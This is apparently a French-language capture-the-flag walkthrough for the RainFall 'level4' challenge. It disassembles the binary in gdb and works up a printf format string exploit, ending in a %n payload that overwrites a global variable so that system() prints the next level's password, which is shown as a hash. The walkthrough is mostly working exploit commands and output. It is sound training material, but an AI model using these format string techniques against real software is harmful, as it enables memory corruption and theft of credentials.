./level4
AAAA
-> AAAA

objdump -d level4
-> dans le main appel à n qui appelle fgets
puis appel à p (qui appelle printf) puis appel system

fgets non exploitable car fgets et non gets

disas n
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax           0x8049810 <m>:   ""
   0x08048492 <+59>:    cmp    $0x1025544,%eax          comparaison de eax avec 0x1025544
   0x08048497 <+64>:    jne    0x80484a5 <n+78>         On skip l'appel system avec pour argument "/bin/cat /home/user/level5/.pass"
   0x08048499 <+66>:    movl   $0x8048590,(%esp)        si la comparaison fail donc pour faire l'appel system, il faut qu'on réussisse la comparaison
   0x080484a0 <+73>:    call   0x8048360 <system@plt>   Il faut que eax = 0x1025544
   0x080484a5 <+78>:    leave  
   0x080484a6 <+79>:    ret  

n +54
(gdb) x/s 0x8049810
0x8049810 <m>:   ""

n+59
(gdb) print 0x1025544
$1 = 16930116

n+66
(gdb) x/s 0x8048590
0x8048590:       "/bin/cat /home/user/level5/.pass"

Comme au level3, on exploite printf

level4@RainFall:~$ python -c 'print "BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
BBBB b7ff26b0 bffff764 b7fd0ff4 0 0 bffff728 804848d bffff520 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825

On trouve notre buffer "BBBB" == "42424242" à la 12e position

En little endian, 0x8049810 donne \x10\x98\x04\x08 donc on met ça à la place de notre "BBBB":

level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
b7ff26b0 bffff764 b7fd0ff4 0 0 bffff728 804848d bffff520 200 b7fd1ac0 b7ff37d0 8049810

On retrouve bien 0x8049810 à la 12e position

Ce qu'on veut, c'est écrire à cette adresse 16930116 caractères

level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + 16930112*"A"' | ./level4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATraceback (most recent call last):
  File "<string>", line 1, in <module>
IOError: [Errno 32] Broken pipe
Le buffer de gets nous bloque donc pour écrire, on va utiliser le format specifier %n

%n "%n is a special format specifier. It cause printf() to load the variable pointed by corresponding argument.
The loading is done with a value which is equal to the number of characters printed by printf() before the occurrence of %n."

%d "To print a number with a certain (minimum) width, say 5 spaces wide, the format specifier is %5d."

Donc on va utiliser:

(python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"') | ./level4

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
